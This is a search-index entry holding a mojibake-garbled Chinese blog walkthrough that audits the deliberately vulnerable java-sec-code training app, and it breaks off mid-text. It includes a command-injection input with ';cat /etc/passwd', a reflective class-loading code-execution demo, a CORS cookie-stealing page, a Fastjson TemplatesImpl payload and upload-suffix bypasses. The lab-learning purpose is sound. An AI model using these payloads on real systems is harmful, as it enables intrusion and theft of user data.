[{"title":"java-sec-codeä¹‹å…¥é—¨å®¡è®¡ï¼ˆä¸€ï¼‰","url":"/2025/07/25/java-sec-code%E4%B9%8B%E5%85%A5%E9%97%A8%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/","content":"<h2 id=\"ä»‹ç»\"><a href=\"#ä»‹ç»\" class=\"headerlink\" title=\"ä»‹ç»\"></a>ä»‹ç»</h2><p>â€‹\tjava-sec-codeé¡¹ç›®æ˜¯ä¸“é—¨ä¸ºjavaä»£ç å®‰å…¨å¼€å‘è®¾è®¡çš„ï¼Œç‰¹åˆ«é€‚åˆæ–°æ‰‹å¿«é€Ÿç†è§£ä¸Šæ‰‹javaä»£ç ä¸­çš„æ¼æ´å½¢å¼ã€‚ç”±äºæ¼æ´ç§ç±»å¾ˆå¤šï¼Œè¿™é‡Œæˆ‘åˆ†ä¸ºå‡ éƒ¨åˆ†å»å†™ã€‚</p>\n<p>â€‹\tç¯å¢ƒæ­å»ºâ€”â€”jdk8u65â€“docker-compose upâ€”ideaå¯åŠ¨</p>\n<h2 id=\"å‘½ä»¤æ³¨å…¥\"><a href=\"#å‘½ä»¤æ³¨å…¥\" class=\"headerlink\" title=\"å‘½ä»¤æ³¨å…¥\"></a>å‘½ä»¤æ³¨å…¥</h2><p>ä¸å®‰å…¨æƒ…å†µ</p>\n<p>â€‹\tè®¿é—®å¯¹åº”çš„è·¯ç”±ï¼Œä¼ å…¥å‚æ•°ï¼Œå¹¶ä¸”ideaå¼€å¯è°ƒè¯•</p>\n<p><img src=\"/images/1.png\"></p>\n<p>å¯ä»¥çœ‹åˆ°è·å–çš„filepathå‚æ•°ç›´æ¥ä¼ å…¥ProcessBuilder</p>\n<p>â€‹\tProcessBuilderæ„é€ å‡½æ•°æ¥å—Stringå­—ç¬¦ä¸²æ–°å»ºè¿›ç¨‹ï¼Œæ‰§è¡Œå¯¹åº”å‘½ä»¤ï¼Œè¿™é‡Œæ–°å»ºshè¿›ç¨‹ï¼Œæ‰§è¡Œäº†lså’Œpingå‘½ä»¤ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œnewçš„æ—¶å€™ä¸ä¼šç›´æ¥åˆ›å»ºè¿›ç¨‹ï¼Œè€Œæ˜¯è¦ç­‰åˆ°Process process &#x3D; builder.start();æ‰ä¼šåˆ›å»ºå¯¹åº”ä¼ å…¥å­—ç¬¦ä¸²çš„è¿›ç¨‹ã€‚</p>\n<p><img src=\"/images/2.png\" alt=\"image-20250720221247244\"></p>\n<p>å®‰å…¨æƒ…å†µ</p>\n<p>â€‹\tè®¿é—®&#x2F;codeinject&#x2F;sec?filepath&#x3D;&#x2F;tmp;cat%20&#x2F;etc&#x2F;passwdï¼Œæ‰“æ–­ç‚¹ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªfilterï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹æ€ä¹ˆå®ç°çš„</p>\n<p><img src=\"/images/3.png\" alt=\"image-20250720223425787\"></p>\n<p>â€‹\tctrlå·¦é”®é”®ç‚¹å‡»cmdFilterï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ªifåˆ¤æ–­ï¼Œifæ²¡åŒ¹é…ä¸Šï¼Œåˆ™è¿”å›nullï¼Œå¦åˆ™è¿”å›inputï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ€åˆä¼ å…¥çš„filepath</p>\n<p><img src=\"/images/4.png\" alt=\"image-20250720224717162\"></p>\n<p>â€‹\tè¿™é‡Œé¡ºä¾¿è¯´ä¸€ä¸‹FILTER_PATTERNæ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡æ¿å¯¹è±¡ï¼Œæ˜¯Patternç±»å‹ï¼ŒPatternç±»ç”¨äºè¡¨ç¤ºç¼–è¯‘åçš„æ­£åˆ™è¡¨è¾¾å¼</p>\n<p>â€‹\tæˆ‘ä»¬å·¦é”®è·Ÿè¿›FILTER_PATTERNï¼Œå¯ä»¥çœ‹åˆ°ä»–å¦‚ä½•ç”Ÿæˆçš„æ¨¡æ¿å¯¹è±¡(é€šè¿‡Patternçš„.compileæ–¹æ³•)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Pattern</span> <span class=\"variable\">FILTER_PATTERN</span> <span class=\"operator\">=</span> Pattern.compile(<span class=\"string\">&quot;^[a-zA-Z0-9_/\\\\.-]+$&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>â€‹\tè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„;å’Œç©ºæ ¼æ˜¯éæ³•çš„ï¼Œæ‰€ä»¥ä¼šreturn â€œBad boy. I got u.â€;</p>\n<p>â€‹\tå¯ä»¥éªŒè¯ä¸€ä¸‹ï¼Œæˆ‘ä»¬æŠŠéæ³•çš„åˆ æ‰ï¼Œå†ä¼ å…¥ã€‚è¿™é‡Œæ²¡æœ‰è¢«æŠ“åˆ°ï¼Œåªæ˜¯è¯´ç›®å½•ä¸å­˜åœ¨ï¼ŒéªŒè¯çŒœæƒ³ã€‚å¯ä»¥æƒ³æƒ³æ˜¯å¦æœ‰åŠæ³•ç»•è¿‡å‘¢ï¼Ÿ</p>\n<p><img src=\"/images/5.png\" alt=\"image-20250720225316420\"></p>\n<h2 id=\"ç±»åŠ è½½ï¼ˆClassDataLoaderï¼‰\"><a href=\"#ç±»åŠ è½½ï¼ˆClassDataLoaderï¼‰\" class=\"headerlink\" title=\"ç±»åŠ è½½ï¼ˆClassDataLoaderï¼‰\"></a>ç±»åŠ è½½ï¼ˆClassDataLoaderï¼‰</h2><p>è¿™é‡Œæˆ‘ä»¬å¦èµ·ç‚‰ç¶ã€‚å…ˆå†™ä¸€ä¸ªé™æ€ä»£ç å—é‡Œå¼¹è®¡ç®—å™¨çš„ç±»ï¼Œç„¶åjavacç¼–è¯‘æˆ.classï¼Œå†base64ç¼–ç ï¼Œèµ‹å€¼ç»™classDataï¼ŒæˆåŠŸå¼¹è®¡ç®—å™¨ï¼Œæ¶‰åŠåå°„å†…å®¹ã€‚åœ¨è°ƒç”¨ defineClass åï¼Œç±»åªæ˜¯è¢«åŠ è½½ï¼Œè¿˜æœªåˆå§‹åŒ–ã€‚ç›´åˆ°è°ƒç”¨ getDeclaredConstructor().newInstance() æˆ–å…¶ä»–æ–¹å¼å®ä¾‹åŒ–ç±»ï¼Œæ‰ä¼šè§¦å‘é™æ€ä»£ç å—ã€‚</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">classData</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAFwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACQAKBwAbDAAcAB0BABJvcGVuIC1hIENhbGN1bGF0b3IMAB4AHwEAE2phdmEvbGFuZy9FeGNlcHRpb24MACAACgEADG9yZy90ZXN0L0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAACAAEACQAKAAEACwAAAB0AAQABAAAABSq3AAGxAAAAAQAMAAAABgABAAAAAwAIAA0ACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAAgACQALAAwACQANAAoAEQAMAA4AAAAHAAJMBwAPBAABABAAAAACABE=&quot;</span>;</span><br><span class=\"line\">            <span class=\"type\">byte</span>[] classBytes = java.util.Base64.getDecoder().decode(classData);</span><br><span class=\"line\">            java.lang.reflect.<span class=\"type\">Method</span> <span class=\"variable\">defineClassMethod</span> <span class=\"operator\">=</span> ClassLoader.class.getDeclaredMethod(</span><br><span class=\"line\">                    <span class=\"string\">&quot;defineClass&quot;</span>, String.class, <span class=\"type\">byte</span>[].class, <span class=\"type\">int</span>.class, <span class=\"type\">int</span>.class);</span><br><span class=\"line\">            defineClassMethod.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            Class&lt;?&gt; cc = (Class&lt;?&gt;) defineClassMethod.invoke(</span><br><span class=\"line\">                    ClassLoader.getSystemClassLoader(), <span class=\"literal\">null</span>, classBytes, <span class=\"number\">0</span>, classBytes.length);</span><br><span class=\"line\">          <span class=\"comment\">//===============================</span></span><br><span class=\"line\">            cc.getDeclaredConstructor().newInstance(); <span class=\"comment\">// æ›¿ä»£ deprecated çš„ newInstance()</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"cors\"><a href=\"#cors\" class=\"headerlink\" title=\"cors\"></a>cors</h2><p>æˆ‘ä»¬çœ‹å¯¹åº”ä»£ç ï¼Œè·å–originè¯·æ±‚å¤´å¹¶ä¸”è®¾ç½®ä¸ºè‡ªå·±çš„å“åº”å¤´ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥èµ·ä¸€ä¸ªç½‘é¡µï¼Œè®©å—å®³è€…è®¿é—®æˆ‘ä»¬çš„ç½‘é¡µåå‘èµ·ä¸€ä¸ªè·¨åŸŸè¯·æ±‚ï¼Œåœ¨è¿›è¡Œè·¨åŸŸè¯·æ±‚çš„æ—¶å€™å¸¦ä¸Šç›®æ ‡ç½‘ç«™çš„cookieï¼Œä»è€Œè·å–åˆ°è¯¥å—å®³è€…å¯¹åº”è´¦å·ã€å¯¹åº”åŠŸèƒ½ç‚¹çš„æ•°æ®ã€‚</p>\n<p>è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ï¼Œfetch&#x2F;xhr&#x2F;formè¡¨å•è¿›è¡Œè·¨åŸŸè¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨å¸¦ä¸Šoriginå¤´</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/cors&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Cors</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">String</span> <span class=\"variable\">info</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;name\\&quot;: \\&quot;JoyChou\\&quot;, \\&quot;phone\\&quot;: \\&quot;18200001111\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/vuln/origin&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">vuls1</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">origin</span> <span class=\"operator\">=</span> request.getHeader(<span class=\"string\">&quot;origin&quot;</span>);</span><br><span class=\"line\">        response.setHeader(<span class=\"string\">&quot;Access-Control-Allow-Origin&quot;</span>, origin); <span class=\"comment\">// set origin from header</span></span><br><span class=\"line\">        response.setHeader(<span class=\"string\">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);  <span class=\"comment\">// allow cookie</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> info;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬pyèµ·ä¸€ä¸ªç½‘é¡µï¼Œç½‘é¡µä»£ç å¦‚ä¸‹ï¼Œå‘èµ·è·¨åŸŸè¯·æ±‚ï¼Œçœ‹æ˜¯å¦èƒ½å¤Ÿè·å–æ•°æ®</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>è·¨åŸŸä¿¡æ¯çªƒå–æ¼”ç¤º<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>æ­£åœ¨å°è¯•çªƒå–ä¿¡æ¯...<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"title function_\">fetch</span>(<span class=\"string\">&quot;http://localhost:8081/cors/vuln/origin&quot;</span>, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">credentials</span>: <span class=\"string\">&quot;include&quot;</span> <span class=\"comment\">// æºå¸¦ç”¨æˆ·çš„ cookie</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    .<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> response.<span class=\"title function_\">text</span>())</span></span><br><span class=\"line\"><span class=\"language-javascript\">    .<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;âœ… çªƒå–æˆåŠŸï¼Œå†…å®¹å¦‚ä¸‹ï¼š&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data); <span class=\"comment\">// ğŸš¨ æ‰“å°çªƒå–çš„æ•æ„Ÿä¿¡æ¯åˆ°æ§åˆ¶å°</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    .<span class=\"title function_\">catch</span>(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(<span class=\"string\">&quot;âŒ çªƒå–å¤±è´¥ï¼š&quot;</span>, err);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;);</span></span><br><span class=\"line\"><span class=\"language-javascript\">  </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>æˆåŠŸï¼Œå¦‚å›¾ï¼Œå¯ä»¥çœ‹åˆ°å‘èµ·äº†ä¸¤æ¬¡è¯·æ±‚ï¼Œå¹¶ä¸”è®¿é—®originç«¯ç‚¹çš„æ—¶å€™æˆåŠŸè·å–ä¿¡æ¯</p>\n<p><img src=\"/images/6.png\" alt=\"image-20250722153721783\"></p>\n<p>ä¿®å¤æ–¹æ¡ˆï¼šç™½åå•ã€åŠ csrf tokenã€‚å…·ä½“ä»£ç å¯ä»¥å‚è€ƒé¡¹ç›®ä¸­ã€‚</p>\n<h2 id=\"crlf\"><a href=\"#crlf\" class=\"headerlink\" title=\"crlf\"></a>crlf</h2><p>jdk8ä¼šå¯¹å¤´è¿›è¡Œè¿‡æ»¤\\r\\nï¼Œä¸ä¼šå­˜åœ¨è¿™ä¸ªæ¼æ´</p>\n<h2 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h2><p>è¿™é‡Œä¸æ·±å…¥åˆ†æã€‚æ‰¾åˆ°fastjsonçš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹è§æ˜¯ç›´æ¥æ¥æ”¶æ•´ä¸ªè¯·æ±‚ä½“ï¼Œæ³¨æ„æ˜¯ctæ˜¯json</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/fastjson&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Fastjson</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/deserialize&quot;, method = &#123;RequestMethod.POST&#125;)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">Deserialize</span><span class=\"params\">(<span class=\"meta\">@RequestBody</span> String params)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// å¦‚æœContent-Typeä¸è®¾ç½®application/jsonæ ¼å¼ï¼Œpostæ•°æ®ä¼šè¢«urlç¼–ç </span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// å°†postæäº¤çš„stringè½¬æ¢ä¸ºjson</span></span><br><span class=\"line\">            <span class=\"type\">JSONObject</span> <span class=\"variable\">ob</span> <span class=\"operator\">=</span> JSON.parseObject(params,Feature.SupportNonPublicField);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ob.get(<span class=\"string\">&quot;name&quot;</span>).toString();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> e.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¯·æ±‚ä½“ï¼Œè¿™é‡Œæˆ‘ä»¬æ ¹æ®ä»£ç ä¸‹é¢æç¤ºç›´æ¥TemplatesImplã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class=\"line\">  &quot;_bytecodes&quot;: [&quot;è¿™é‡Œæ˜¯base64ç¼–ç çš„gadget&quot;],</span><br><span class=\"line\">  &quot;_name&quot;: &quot;lightless&quot;,</span><br><span class=\"line\">  &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class=\"line\">  &quot;_outputProperties&quot;: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"æ–‡ä»¶ä¸Šä¼ \"><a href=\"#æ–‡ä»¶ä¸Šä¼ \" class=\"headerlink\" title=\"æ–‡ä»¶ä¸Šä¼ \"></a>æ–‡ä»¶ä¸Šä¼ </h2><p>è¿™é‡Œæœ‰ä¸¤ä¸ªæ¥å£ï¼Œä¸€ä¸ªæ˜¯ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„æ¥å£ï¼Œä¸€ä¸ªæ˜¯è®©ä¸Šä¼ å›¾ç‰‡çš„æ¥å£ã€‚ä»»æ„æ–‡ä»¶ä¸Šä¼ å°±ä¸è¯´äº†ï¼Œå¯ä»¥çœ‹çœ‹ä¸Šä¼ imageçš„ä»£ç ã€‚</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@PostMapping(&quot;/upload/picture&quot;)</span></span><br><span class=\"line\">   <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">   <span class=\"keyword\">public</span> String <span class=\"title function_\">uploadPicture</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;file&quot;)</span> MultipartFile multifile)</span> </span><br></pre></td></tr></table></figure>\n\n<p>å¯ä»¥çœ‹åˆ°ä»£ç é‡Œé¢ç”¨åˆ°äº†å‡ ä¸ªæ–¹æ³•ï¼Œéƒ½æ˜¯å½“å‰ç±»çš„æ–¹æ³•ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">convert\t//ç”Ÿæˆéšæœºæ–‡ä»¶åçš„æ–‡ä»¶</span><br><span class=\"line\">isImag  //åˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡ BufferedImage bi = ImageIO.read(file);</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨uploadPictureæ–¹æ³•ä¸­ï¼Œè®¾ç½®äº†æ–‡ä»¶åç¼€åç™½åå•ï¼ŒMIMEé»‘åå•ã€‚è§‚å¯Ÿä¸‹é¢ä»£ç ï¼Œè¿™ç§è·å–æ–‡ä»¶åç¼€åçš„æ–¹å¼å¯ä»¥é€šè¿‡åŒåç¼€åç»•è¿‡ï¼Œæ¯”å¦‚è¯´.jsp;.pngï¼Œå¹¶ä¸”ç»“åˆä¸€äº›è§£ææ¼æ´æˆ–è€…tomcatè‡ªå·±æœ¬èº«çš„ç‰¹æ€§å¯¼è‡´æœ€ç»ˆè½åœ°æ–‡ä»¶ä¸ºépngã€‚ï¼ˆnginxåªæ ¹æ®æœ€åä¸€ä¸ªåç¼€åˆ¤æ–­MIMEï¼Œtomcatåˆ™æŠŠï¼›åçš„è¯†åˆ«ä¸ºå‚æ•°åˆ—è¡¨ï¼‰</p>\n<p><img src=\"/images/7.png\" alt=\"image-20250724110727137\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // è·å–æ–‡ä»¶åç¼€å</span><br><span class=\"line\">...</span><br><span class=\"line\">if (Suffix.toLowerCase().equals(white_suffix))</span><br></pre></td></tr></table></figure>\n\n<p>é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œæ–‡ä»¶è§£æçš„æ—¶å€™åˆ†ä¸ºå‡ ç§æƒ…å†µã€‚æµè§ˆå™¨è§£ææ–‡ä»¶çš„æ—¶å€™æ ¹æ®Content-Typeï¼ŒwebæœåŠ¡å™¨æ–‡ä»¶è½åœ°æ˜¯æ ¹æ®æ–‡ä»¶åç¼€åè§£æï¼ŒJavaåç«¯å¤„ç†æ–‡ä»¶åˆ™æ˜¯æ ¹æ®æ–‡ä»¶å†…å®¹ï¼ˆmagic numberï¼‰ï¼Œæ­¤æ—¶ctå’Œåç¼€åéƒ½å¯ä»¥å¿½ç•¥ã€‚</p>\n<p>é€šè¿‡é€šè¯»ä»£ç ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å‘ç°ï¼Œç”Ÿæˆuuidæ–‡ä»¶åï¼Œåªç”¨äºæ£€éªŒæ–‡ä»¶å†…å®¹å°±æ¶ˆé™¤äº†ï¼Œæœ€ç»ˆè½åœ°çš„æ–‡ä»¶åæ²¡æœ‰ç”¨åˆ°convertã€‚</p>\n<h2 id=\"JDBC\"><a href=\"#JDBC\" class=\"headerlink\" title=\"JDBC\"></a>JDBC</h2><p>å…´è‡´æ¥äº†ï¼Œç®€å•è°ƒè¯•ä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« <a href=\"https://tttang.com/archive/1462/\">https://tttang.com/archive/1462/</a></p>\n<p>å¼‚å¸¸è·Ÿè¸ªæ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°è¡Œå·å¯¹ä¸ä¸Šçš„æƒ…å†µï¼Œæ³¨æ„ä¸Šä¸‹æ–‡çœ‹çœ‹ã€‚ç”šè‡³ä¼šå‡ºç°åœ¨å¦å¤–ä¸€ä¸ªæ–¹æ³•é‡Œï¼Œæˆ‘è¿™é‡Œè°ƒè¯•çš„æ—¶å€™å°±å‡ºç°äº†è¿™ä¸ªé—®é¢˜ã€‚</p>\n<p>Propertyæ˜¯æŒ‡åœ¨å»ºç«‹è¿æ¥æ—¶æ”¯æŒçš„JDBCè¿æ¥å±æ€§ã€‚</p>\n<p>å…ˆå†™ä¸€ä¸ªæµ‹è¯•ä»£ç </p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> SQLException &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">jdbcUrl</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&amp;socketFactoryArg=&quot;</span>;</span><br><span class=\"line\">  \t\t\t</span><br><span class=\"line\">        DriverManager.getConnection(jdbcUrl);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬çœ‹çœ‹sinkç‚¹instantiateæ–¹æ³•ï¼Œå¯ä»¥å‘ç°é€šè¿‡åå°„å»å®ä¾‹åŒ–å¯¹è±¡ã€‚æ³¨æ„cls.getConstructor(String.class);ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ„é€ æ–¹æ³•åªæœ‰ä¸€ä¸ªStringå½¢å‚çš„æ¶æ„ç±»ã€‚å‚è€ƒpç¥ï¼ˆ<a href=\"https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html%EF%BC%89%E3%80%82%E2%80%9C%E8%BF%99%E4%B8%A4%E4%B8%AA%E7%B1%BB%E6%98%AFSpring%E4%B8%AD%E7%94%A8%E4%BA%8E%E5%8A%A0%E8%BD%BDXML%E6%A0%BC%E5%BC%8F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%B1%BB%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%85%B6%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1%E3%80%81%E8%B0%83%E7%94%A8%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%EF%BC%8C%E9%80%9A%E5%B8%B8%E4%BC%9A%E4%BD%9C%E4%B8%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E5%88%A9%E7%94%A8%E9%93%BE%E3%80%82%E4%B8%8D%E8%BF%87%E8%BF%99%E4%B8%A4%E4%B8%AA%E7%B1%BB%E5%8F%AA%E8%83%BD%E5%8A%A0%E8%BD%BDURL%EF%BC%8C%E6%97%A0%E6%B3%95%E7%9B%B4%E6%8E%A5%E5%B0%86XML%E4%BC%A0%E5%85%A5%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E5%B8%B8%E8%AE%A4%E4%B8%BA%E9%9C%80%E8%A6%81%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXML%E6%96%87%E4%BB%B6%EF%BC%8C%E6%88%96%E8%80%85%E5%85%88%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0%E5%86%99%E6%96%87%E4%BB%B6%E6%89%8D%E8%83%BD%E5%88%A9%E7%94%A8%E3%80%82%E2%80%9D\">https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.htmlï¼‰ã€‚â€œè¿™ä¸¤ä¸ªç±»æ˜¯Springä¸­ç”¨äºåŠ è½½XMLæ ¼å¼é…ç½®æ–‡ä»¶çš„ç±»ï¼Œç”±äºå…¶ä¸­å¯ä»¥å®ä¾‹åŒ–å¯¹è±¡ã€è°ƒç”¨é™æ€æ–¹æ³•ï¼Œé€šå¸¸ä¼šä½œä¸ºæ¼æ´åˆ©ç”¨çš„ä¸€ä¸ªé‡è¦åˆ©ç”¨é“¾ã€‚ä¸è¿‡è¿™ä¸¤ä¸ªç±»åªèƒ½åŠ 